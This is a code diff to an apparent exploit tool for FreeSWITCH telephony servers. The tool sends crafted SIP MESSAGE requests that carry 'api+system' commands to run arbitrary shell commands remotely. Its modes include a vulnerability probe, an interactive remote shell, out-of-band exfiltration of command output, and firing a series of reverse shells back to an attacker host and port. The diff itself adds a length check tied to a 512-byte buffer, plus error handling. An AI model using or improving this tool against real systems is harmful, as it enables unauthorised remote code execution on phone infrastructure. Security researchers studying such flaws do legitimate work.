@@ -218,10 +218,23 @@ class SipError(Exception):
     pass
 
 
+MAX_TO_USER = 500  # sofia_presence copies the To user into char proto[512]
+
+
 def _quote_user(value: str) -> str:
     # encode everything except unreserved; '+' must survive literally only as
     # the proto separator, so any '+' inside the command is %2B.
     return urllib.parse.quote(value, safe="")
+
+
+def _to_user(arg: str) -> str:
+    """Encode api+<arg>, refusing values FreeSWITCH would truncate."""
+    value = "api+" + _quote_user(arg)
+    if len(value.encode()) > MAX_TO_USER:
+        raise SipError(
+            f"encoded To user is {len(value)} bytes; FreeSWITCH copies it into "
+            f"a 512-byte buffer. Shorten the command or the --oob-url.")
+    return value
 
 
 def sip_message(method: str, host: str, port: int, to_user: str, lhost: str,
@@ -603,7 +616,7 @@ def probe_target(host: str, port: int, timeout: float, udp: bool,
         if m:
             out["version"] = m.group(1)
 
-        r = cli.exchange("MESSAGE", host, port, "api+version", body=b"probe",
+        r = cli.exchange("MESSAGE", host, port, _to_user("version"), body=b"probe",
                          ctype="text/plain", timeout=timeout)
         out["verdict"] = classify(r)
         if out["verdict"] == "vulnerable" and not (out["freeswitch"] or out["version"]):
@@ -634,7 +647,7 @@ def run_remote(host: str, port: int, cmd: str, oob: Oob | None, timeout: float,
     cli.open()
     try:
         arg = "system " + (exfil_command(cmd, oob.url()) if oob else cmd)
-        r = cli.exchange("MESSAGE", host, port, "api+" + _quote_user(arg),
+        r = cli.exchange("MESSAGE", host, port, _to_user(arg),
                          body=b"x", ctype="text/plain", timeout=timeout)
         result = {"status": r["status"], "verdict": classify(r), "output": "", "ok": False}
         if r["reply"] is not None:                       # read-back (reaches From host)
@@ -660,7 +673,7 @@ def blind(host: str, port: int, cmd: str, timeout: float, udp: bool,
     cli.open()
     try:
         r = cli.exchange("MESSAGE", host, port,
-                         "api+" + _quote_user("system " + cmd), body=b"x",
+                         _to_user("system " + cmd), body=b"x",
                          ctype="text/plain", timeout=timeout, want_reply=False)
         return {"status": r["status"], "verdict": classify(r)}
     finally:
@@ -790,7 +803,11 @@ def cmd_exploit(args) -> int:
     try:
         res = {}
         for i in range(max(1, args.retries)):
-            res = run_remote(host, port, args.cmd or "id", oob, **kws)
+            try:
+                res = run_remote(host, port, args.cmd or "id", oob, **kws)
+            except SipError as exc:
+                log(red("[!] ") + str(exc))
+                return 2
             if res.get("ok"):
                 break
             if i + 1 < max(1, args.retries):
@@ -833,7 +850,11 @@ def cmd_shell(args) -> int:
     kws = dict(timeout=args.timeout, udp=not args.tcp, user=args.user,
                password=args.password, lport=args.lport, lhost=args.lhost)
     try:
-        first = run_remote(host, port, "id", oob, **kws)
+        try:
+            first = run_remote(host, port, "id", oob, **kws)
+        except SipError as exc:
+            log(red("[!] ") + str(exc))
+            return 2
         if not first.get("ok"):
             log(red("[!] ") + f"no callback (verdict {first['verdict']})")
             if first["verdict"] == "auth-required":
@@ -853,7 +874,11 @@ def cmd_shell(args) -> int:
                 break
             if not cmd:
                 continue
-            r = run_remote(host, port, cmd, oob, **kws)
+            try:
+                r = run_remote(host, port, cmd, oob, **kws)
+            except SipError as exc:
+                log(red("[!] ") + str(exc))
+                continue
             sys.stdout.write(r.get("output", "") if r.get("output", "").endswith("\n")
                              else r.get("output", "") + "\n")
         return 0
@@ -878,9 +903,13 @@ def cmd_rev(args) -> int:
     log(violet("[*] ") + f"firing reverse shells at {host}:{port} -> {lh}:{lp}")
     rc = 1
     for name, tpl in REVSHELLS:
-        r = blind(host, port, tpl.format(h=lh, p=lp), timeout=args.timeout,
-                  udp=not args.tcp, user=args.user, password=args.password,
-                  lport=args.lport, lhost=args.lhost, proxy=proxy)
+        try:
+            r = blind(host, port, tpl.format(h=lh, p=lp), timeout=args.timeout,
+                      udp=not args.tcp, user=args.user, password=args.password,
+                      lport=args.lport, lhost=args.lhost, proxy=proxy)
+        except SipError as exc:
+            log(red("[!] ") + str(exc))
+            return 2
         print(f"  {name:<8} -> {r['status']} ({r['verdict']})")
         if r["status"] in (200, 202):
             rc = 0
